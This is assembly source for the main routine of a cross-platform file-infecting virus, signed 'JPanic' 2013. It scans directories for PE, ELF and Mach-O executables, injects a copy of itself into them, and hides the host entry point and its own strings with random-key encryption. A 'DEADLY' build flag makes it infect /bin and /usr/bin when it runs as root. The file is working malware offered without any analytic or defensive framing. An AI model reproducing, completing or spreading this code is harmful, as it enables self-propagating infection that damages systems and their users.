;= Virus Main Procedure (c) 2013 JPanic ===================================
;
; The main virus routine.
;
; PUBLICS:
;	VMain()
;	dwOrigEIP	DWORD
;
;= Directive Warez ========================================================
	
	.486	
	locals @@
	.model flat

_VMAIN_ASM	EQU 	TRUE

include inc\win32.inc
include inc\short.inc
include inc\stack.inc
include inc\elf.inc
include inc\macho.inc
include vmain.ash
include osprocs.ash
include inf-pe.ash
include inf-elf.ash
include inf-macho.ash
include rand.ash
	
;= Code Warez =============================================================
        include codeseg.ash
;= VMain ==================================================================
; Outputs:
;	None.
;
;--------------------------------------------------------------------------
PUBLIC VMain
VMain			PROC
			
			push	eax
			pushf
			pushad
			cld
			call	@@delta
		@@delta:pop	esi
			sub	esp,size _VirusHeap
			lea	ebp,[esp+7Fh]			
			sub	esi,(ofs @@delta - ofs VMain)
			mov	[vheap.dwVirusDelta],esi
			mov	ecx,vsize
			mov	[vheap.dwVirusSize],ecx
			or	edx,-1
		@@ByteLoop:	lodsb
				mov	ah,8
				xor	dl,al
			@@BitLoop:	
				shr	edx,1
				.if     carry?
					xor	edx,0EDB88320h
				.endif
				dec	ah
				jnz	@@BitLoop			
			loop	@@ByteLoop				
			xchg	edx,eax			
			lea	edi,[vheap.dwRandSeed]
			stosd
			xchg	eax,ecx
			stosd
			stosd
			stosd
			stosd
			stosd
			mov	al,'.'
			stosd
			call	Fill_Proc_Table
			call	dwo [vheap.dwVInit]
			jb	@@exit
			; Infect "."
			call	InfectDir$NoChdir
			; Infect System Dir's if ROOT.
			call	SetupDirRegs
			lea	edi,[vheap.dwDirCWD]
			call	dwo [vheap.dwVDirSetup]
			mov	eax,[vheap.dwEUID]
			test	eax,eax				; root user only
			jnz	@@exit
			cmp	dwo [vheap.dwDirCWD],eax	; make sure we have current dir.
			je	@@exit
			mov	ebx,[vheap.dwDirA]
			call	InfectDir
			mov	ebx,[vheap.dwDirB]
			call	InfectDir
			mov	ebx,[vheap.dwDirCWD]
			call	[vheap.dwVChdir]
		@@exit: lea	esi,[vheap.dwDirCWD]
			call	dwo [vheap.dwVExit]
			; Compute EIP
			mov 	eax,1BADDEEDh
			org	$-4
			dwEIPEkey dd 1
			mov	ecx,eax
			@@solve_inv:				
				mov	ebx,eax
				imul	ecx
				dec	eax
				jz	@@eip_calculated
				add	eax,ebx
				jmp	@@solve_inv
			@@eip_calculated:	
				;mov	eax,ebx
			; ebx = mulinv (decryption key)
			imul	ebx,ebx,1BADD00Dh
			org	$-4
			dwCryptEIP dd offset VHost
			lea	esp,[ebp + size _VirusHeap - 07Fh]
			mov	[esp.dwRET],ebx
			popad
			popf
			ret			
VMain			ENDP

;--------------------------------------------------------------------------
InfectDir		PROC
; ebx = target dir.
			test	ebx,ebx
			jz	@@exit
			call	dwo [vheap.dwVChdir]
			jb	@@exit
InfectDir$NoChdir:	and	dwo [vheap.dwFindHandle],0
			call	dwo [vheap.dwVFindFirst]			
		@@FindLoop:	jc	@@FindDone
				mov	[vheap.dwFileSize],ecx
				jecxz	@@FindNext
				;bsr   eax,ecx
				db      0Fh,0BDh,0C1h
				cmp	al,12		; 4k min
				jb	@@FindNext
				cmp	al,23		; 8mb max
				jae	@@FindNext
				and	dwo [vheap.dwSavedFMode],0
				call	dwo [vheap.dwVOpenFile]
				jc	@@FindNext
				xchg	eax,ebx
					call	IsImagePE
					jne	@@ci1
					call	InfectPE
					jmp	@@close
				@@ci1:	cmp	dwo [ebx],ELF_MAGIC
					jne	@@ci2
					call	InfectELF
					jmp	@@close
				@@ci2:  cmp	dwo [ebx],mach_MH_MAGIC
					jne	@@ci3
					call	InfectMACHO
					jmp	@@close
				@@ci3:  cmp	dwo [ebx],FAT_CIGAM
					jne	@@close
					call	InfectFAT
			@@close:call	dwo [vheap.dwVCloseFile]
			@@FindNext:
				call	dwo [vheap.dwVFindNext]
				jmp	@@FindLoop
			@@FindDone:
			call	dwo [vheap.dwVFindClose]
		@@exit:	ret
InfectDir		ENDP

;--------------------------------------------------------------------------
extrn txt1:WORD
extrn txt2:WORD

PUBLIC BuildVBody
BuildVBody              PROC
			push	ebx
                        ; Copy virus, Set dwOrigEIP=eax, OS_Proc_Switch=dl                        
			push	edi             ; Save new virus body offset.            
			mov	ecx,[vheap.dwVirusSize]
			mov	esi,dwo [vheap.dwVirusDelta]
			rep	movsb
			pop	ebx             ; EBX = virus body
			; Correct Virus Image.			
			mov	by [(ebx-VCode).OS_Proc_Switch],dl
			; Crypt/Set EIP
			xchg	eax,edx
			call	GetRand32
			or	al,1
			mov	dwo [(ebx-VCode).dwEIPEkey],eax
			mul	edx
			mov	dwo [(ebx-VCode).dwCryptEIP],eax			
			;Encrypt Text Strings
			call	@@skiptxttable
				dd	(offset txt0 - VCode)
				org	$-2
				dd	(offset txt1 - VCode)
				org	$-2
				dd	(offset txt2 - VCode)
				org	$-2		
			@@skiptxttable:			
			pop	esi
			pushad
			push	3
			pop	ecx
			@@stringloop:
				call	GetRand32
				xchg	eax,edx				
				xor	eax,eax
				lodsw				
				pushad
				lea	esi,[eax+ebx]
				xor	eax,eax
				lodsw
				xchg	ecx,eax
				mov	edi,esi
				@@charloop:
					lodsb
					xor	al,dl					
					stosb
					loop	@@charloop			
				popad
			loop	@@stringloop
			popad
			pop	ebx
			ret
BuildVBody              ENDP

;--------------------------------------------------------------------------
; ECX = "."
; ESI = DirA
; EDX = DirB
PUBLIC SetupDirRegs
SetupDirRegs		PROC

			lea	ecx,[vheap.dwDOT]
			call	@@skip1
				ifdef DEADLY
					db "/bin",0
				else
					db "/testa",0
				endif
		@@skip1:pop	esi
			call	@@skip2
				ifdef DEADLY
					db "/usr/bin",0
				else
					db "/testb",0
				endif
		@@skip2:pop	edx
			ret
SetupDirRegs		ENDP

txt0	dw	(ofs txt0e - txt0s)
txt0s:	db      VName," (c) 2013 JPanic, Australia.",0
txt0e:

;==========================================================================
                        ENDS
			END	VMain
;==========================================================================
